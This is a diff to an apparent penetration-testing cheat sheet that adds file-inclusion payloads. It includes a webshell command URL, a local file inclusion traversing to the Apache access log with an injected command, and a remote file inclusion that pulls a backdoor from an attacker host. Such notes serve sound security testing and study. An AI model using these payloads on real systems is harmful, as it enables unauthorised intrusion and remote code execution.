@@ -237,15 +237,22 @@ feroxbuster -u http://<target> -w <wordlist>
 </details>
 
 <details>
-  <summary><strong>Remote File Execution</strong></summary>
+  <summary><strong>File Inclusions</strong></summary>
 
   ### webshells
   https://github.com/tennc/webshell/tree/master/fuzzdb-webshell
 
+  ### Webshell
   ```bash
   http://<target>/webshell.php?cmd=id
   ```
 
+  ### Local File Inclusion
+  ```bash
+  http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
+  ```
+
+  ### Remote File Inlcusion
   ```bash
   http://<target>/index.php?page=http://<attacker-ip>/simple-backdoor.php&cmd=ls
   ```
